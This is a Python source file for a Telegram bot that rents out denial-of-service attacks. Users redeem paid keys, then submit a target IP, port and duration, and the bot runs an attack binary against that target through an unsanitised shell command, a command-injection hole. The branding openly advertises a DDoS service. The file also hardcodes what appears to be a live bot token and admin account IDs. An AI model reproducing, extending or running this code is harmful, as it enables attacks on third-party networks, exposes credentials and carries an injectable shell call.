import time
import logging
import json
import os
from threading import Thread
import telebot
import asyncio
import random
import string
from datetime import datetime, timedelta
from telebot.apihelper import ApiTelegramException

# Convert ADMIN_IDS to a list of integers
ADMIN_IDS = 6768273586, 2007860433, 5004674194  # Changed from string to list of integers
BOT_TOKEN = "7527768602:AAGzHw1r_xEPAOVydKBikd2Qgnv1u8UNCvk"

bot = telebot.TeleBot(BOT_TOKEN)
redeemed_keys = set()

# File paths
USERS_FILE = 'users.txt'
KEYS_FILE = 'key.txt'

keys = {}

def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)  # Load users as a JSON array
    except FileNotFoundError:
        return []  # Return an empty list if the file does not exist
    except json.JSONDecodeError:
        return []  # Return an empty list if the file is empty or corrupted

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)  # Save users as a JSON array

def get_username_from_id(user_id):
    users = load_users()
    for user in users:
        if user['user_id'] == user_id:
            return user.get('username', 'N/A')
    return "N/A"

def is_admin(user_id):
    return user_id in ADMIN_IDS

def load_keys():
    if not os.path.exists(KEYS_FILE):
        return {}
    keys = {}
    with open(KEYS_FILE, 'r') as f:
        for line in f:
            key_data = json.loads(line.strip())
            keys.update(key_data)
    return keys

def save_keys(keys):
    with open(KEYS_FILE, 'w') as f:
        for key, value in keys.items():
            f.write(f"{json.dumps({key: value})}\n")

def generate_key(length=18):
    """Generate a random key of specified length."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def add_keys_to_dict(key, duration):
    """Add generated key and its expiration to the dictionary."""
    expiration_time = datetime.now() + duration
    keys[key] = expiration_time

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
    command = f"./mrin {target_ip} {target_port} {duration} 1200"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        # Process stdout and stderr
        output = stdout.decode().replace("", "@MrinMoYxCB | @M_o_Y_007")  # Replace with your name
        error = stderr.decode()

        # Log output and errors for debugging
        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")
            bot.send_message(chat_id, "Error occurred while running the attack. Check logs for more details.")
            return

        # Notify success only if there's no error
        bot.send_message(chat_id, "🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆  🚀")
    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
        bot.send_message(chat_id, "Failed to execute the attack. Please try again later.")

# Attack command
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    users = load_users()
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if not found_user:
        bot.send_message(chat_id, "*You are not registered. Please redeem a key.\nContact For New Key:- @MrinMoYxCB | @M_o_Y_007*", parse_mode='Markdown')
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message, chat_id):
    try:
        args = message.text.split()
        
        # Ensure we have 3 arguments
        if len(args) != 3:
            bot.send_message(chat_id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
            return
        
        target_ip = args[0]
        
        # Validate that the port is an integer
        try:
            target_port = int(args[1])
        except ValueError:
            bot.send_message(chat_id, "*Port must be a valid number.*", parse_mode='Markdown')
            return
        
        # Validate that the duration is an integer
        try:
            duration = int(args[2])
        except ValueError:
            bot.send_message(chat_id, "*Duration must be a valid number.*", parse_mode='Markdown')
            return

        # Ensure duration does not exceed 200 seconds
        if duration > 200:
            bot.send_message(chat_id, "*Duration must be 200 seconds or less.*", parse_mode='Markdown')
            return

        # Check if the port is blocked
        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        # Run the attack command asynchronously
        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(target_ip, target_port, duration, chat_id), loop)
        bot.send_message(chat_id, f"𝗖𝗵𝗮𝗻𝗴𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗜𝗣 𝗶𝗻 𝗲𝘃𝗲𝗿𝘆 𝟱 𝗦𝗲𝗰𝗼𝗻𝗱𝘀")
        bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸  𝗦𝗲𝗻𝘁  𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁 : {target_ip}, \n𝗣𝗼𝗿𝘁 : {target_port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 : {duration} seconds")
    
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(chat_id, "*An error occurred while processing your command.*", parse_mode='Markdown')

# Start asyncio thread
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

from telebot.types import ReplyKeyboardMarkup, KeyboardButton

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or "N/A"

    # No user addition logic here; we only allow users who redeem keys
    welcome_message = (f"*𝗪𝗲𝗹𝗰𝗼𝗺𝗲, {username} 𝘁𝗼 𝗡𝗘𝗘𝗥𝗔𝗝 𝘅 𝗗𝗜𝗟𝗗𝗢𝗦™ 𝗕𝗼𝗧* ! \n\n"
                       f"*𝗣𝗹𝗲𝗮𝘀𝗲 𝗚𝗲𝘁 𝗮 🔑 𝗞𝗲𝗬 𝗳𝗿𝗼𝗺  @H3X_neeraj 𝘁𝗼 𝗮𝗰𝗰𝗲𝘀𝘀 𝗯𝗼𝘁 𝗳𝘂𝗻𝗰𝘁𝗶𝗼𝗻𝗮𝗹𝗶𝘁𝗶𝗲𝘀..*\n", parse_mode='Markdown')

    # Create buttons for "My Account" and "Attack"
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    attack_button = KeyboardButton("🚀 Attack")
    my_account_button = KeyboardButton("👤 My Account")
    markup.add(attack_button, my_account_button)

    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

@bot.message_handler(commands=['genkey'])
def genkey_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Check if the user is an admin
    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to generate keys.\nContact Owner for keys: @H3X_neeraj*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) != 3:
        bot.send_message(chat_id, "*Usage: /genkey <amount> <hours/days>*", parse_mode='Markdown')
        return
    amount = int(cmd_parts[1])
    time_unit = cmd_parts[2].lower()
    duration = None
    if time_unit in ['hour', 'hours']:
        duration = timedelta(hours=amount)
    elif time_unit in ['day', 'days']:
        duration = timedelta(days=amount)
    else:
        bot.send_message(chat_id, "*Invalid time unit. Use 'hours' or 'days'.*", parse_mode='Markdown')
        return
    # Generate a single key without expiration time
    key = generate_key()
    keys[key] = duration  # Store duration instead of expiration time
    bot.send_message(chat_id, f"🔑 *𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗸𝗲𝘆 🔑 for {duration}* :  `/redeem {key}`\n\n*Please redeem the key to access our BOT*", parse_mode='Markdown')


@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if len(cmd_parts) != 2:
        bot.send_message(chat_id, "*Usage: /redeem <key>*", parse_mode='Markdown')
        return

    key = cmd_parts[1]
    users = load_users()

    # Check if the key is valid and not already redeemed
    if key in keys and key not in redeemed_keys:
        duration = keys[key]  # Assuming this is a timedelta
        expiration_time = datetime.now() + duration

        # Save the user info to users.txt
        found_user = next((user for user in users if user['user_id'] == user_id), None)
        if not found_user:
            new_user = {
                'user_id': user_id,
                'username': f"@{message.from_user.username}" if message.from_user.username else "Unknown",
                'valid_until': expiration_time.isoformat().replace('T', ' '),  # Format valid until
                'current_date': datetime.now().isoformat().replace('T', ' '),  # Current date format
                'plan': 'Gold Premium'  # Replace with actual plan if needed
            }
            users.append(new_user)
        else:
            found_user['valid_until'] = expiration_time.isoformat().replace('T', ' ')
            found_user['current_date'] = datetime.now().isoformat().replace('T', ' ')

        # Mark the key as redeemed
        redeemed_keys.add(key)
        save_users(users)

        bot.send_message(chat_id, "🗝️ *𝗞𝗲𝘆 𝗿𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆* ✅", parse_mode='Markdown')
    else:
        if key in redeemed_keys:
            bot.send_message(chat_id, "🗝️ *𝗧𝗵𝗶𝘀 𝗸𝗲𝘆 𝗵𝗮𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗯𝗲𝗲𝗻 𝗿𝗲𝗱𝗲𝗲𝗺𝗲𝗱 ⚠️ \n\nContact Owner :- @H3X_neeraj7*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "Invalid key!")

@bot.message_handler(commands=['remove'])
def remove_user_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to remove users.\nContact Owner :- @H3X_neeraj*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) != 2:
        bot.send_message(chat_id, "*Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(cmd_parts[1])
    users = load_users()
    users = [user for user in users if user['user_id'] != target_user_id]
    save_users(users)

    bot.send_message(chat_id, f"User {target_user_id} has been removed.")

@bot.message_handler(commands=['users'])
def list_users_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to view the users.*", parse_mode='Markdown')
        return

    users = load_users()
    valid_users = [user for user in users if datetime.now() < datetime.fromisoformat(user['valid_until'])]

    if valid_users:
        user_list = "\n".join(f"𝙐𝙎𝙀𝙍𝙄𝘿 : {user['user_id']}, 𝙐𝙎𝙀𝙍𝙉𝙖𝙈𝙀 : {user.get('username', 'N/A')}" for user in valid_users)
        bot.send_message(chat_id, f"𝗥𝗲𝗴𝗶𝘀𝘁𝗲𝗿𝗲𝗱 𝗮𝗹𝗹 𝘂𝘀𝗲𝗿𝘀:\n\n{user_list}")
    else:
        bot.send_message(chat_id, "No users have valid keys.")

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def attack_button_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    users = load_users()
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if not found_user:
        bot.send_message(chat_id, "*You are not registered. Please redeem A key from Owner:- @H3X_neeraj*", parse_mode='Markdown')
        return

    # Check if the user's key is still valid
    valid_until = datetime.fromisoformat(found_user['valid_until'])
    if datetime.now() > valid_until:
        bot.send_message(chat_id, "*Your key has expired. Please redeem A new key from Owner:- @H3X_neeraj.*", parse_mode='Markdown')
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack button: {e}")

@bot.message_handler(func=lambda message: message.text == "👤 My Account")
def my_account(message):
    user_id = message.from_user.id
    users = load_users()

    # Find the user in the list
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if found_user:
        valid_until = datetime.fromisoformat(found_user.get('valid_until', 'N/A')).strftime('%Y-%m-%d %H:%M:%S')
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Check if the user's key is still valid
        if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
            account_info = ("Your key has expired. Please redeem a new key.\n"
                            "Contact @MrinMoYxCB | @M_o_Y_007 for assistance.")
        else:
            account_info = (f"👤 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 👤\n\n"
                            f"🤡 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : {found_user.get('username', 'N/A')}\n"
                            f"🆔 𝗨𝘀𝗲𝗿 𝗜𝗗 : {user_id}\n"
                            f"📅 𝗘𝘅𝗽𝗶𝗿𝘆 𝗗𝗮𝘁𝗲 : {valid_until}\n"
                            f"🔖 𝗣𝗹𝗮𝗻 : {found_user.get('plan', 'N/A')}\n"
                            f"⏲️ 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗧𝗶𝗺𝗲 : {current_time}")
    else:
        account_info = "𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮 𝗸𝗲𝘆 𝗙𝗿𝗼𝗺 𝗢𝘄𝗻𝗲𝗿 :- @H3X_neeraj."

    bot.send_message(message.chat.id, account_info)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = message.from_user.id  # Get the ID of the user sending the command
    if is_admin(user_id):  # Check if the user is an admin
        command = message.text.split(maxsplit=1)  # Split the command to extract the message
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Team MRiNxDiLDOS :\n\n" + command[1]
            users = load_users()  # Load all registered users from 'users.txt'
            for user in users:
                try:
                    bot.send_message(user['user_id'], message_to_broadcast)
                except Exception as e:
                    logging.error(f"Failed to send broadcast message to user {user['user_id']}: {e}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = " Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)


if __name__ == '__main__':
    loop = asyncio.new_event_loop()
    Thread(target=start_asyncio_thread).start()

    while True:
        try:
            bot.polling(timeout=60)
        except ApiTelegramException as e:
            print(f"Error: {e}")
            time.sleep(5)  # Wait for 5 seconds before retrying
        except Exception as e:
            print(f"Unexpected error: {e}")
            time.sleep(5)
